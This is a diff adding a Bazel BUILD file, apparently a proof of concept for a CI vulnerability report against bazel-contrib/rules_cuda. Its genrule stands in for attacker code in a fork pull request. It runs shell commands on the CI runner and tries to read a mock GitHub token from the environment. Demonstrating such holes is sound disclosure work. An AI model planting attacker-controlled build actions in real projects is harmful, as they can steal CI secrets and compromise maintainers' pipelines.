@@ -1,0 +1,18 @@
+# This file stands in for a file an attacker would place at
+# examples/BUILD.bazel in their own fork PR against bazel-contrib/rules_cuda.
+# The real integration-tests.yaml workflow runs:
+#   cd examples && bazelisk build ... @rules_cuda_examples//nccl:perf_binaries
+# which means whatever genrule(s)/build actions exist under examples/ at the
+# PR's HEAD commit execute as part of that build -- including this one.
+
+genrule(
+    name = "perf_binaries",
+    outs = ["perf_binaries_out.txt"],
+    cmd = """
+echo "=== ATTACKER-CONTROLLED BUILD ACTION EXECUTING ON THE CI RUNNER ===" >&2
+echo "whoami: $$(whoami), pwd: $$(pwd)" >&2
+echo "Attempting to read MOCK_GITHUB_TOKEN from process environment:" >&2
+echo "MOCK_GITHUB_TOKEN=$${MOCK_GITHUB_TOKEN:-<not inherited into bazel genrule sandbox by default>}" >&2
+echo "ok" > $@
+""",
+)
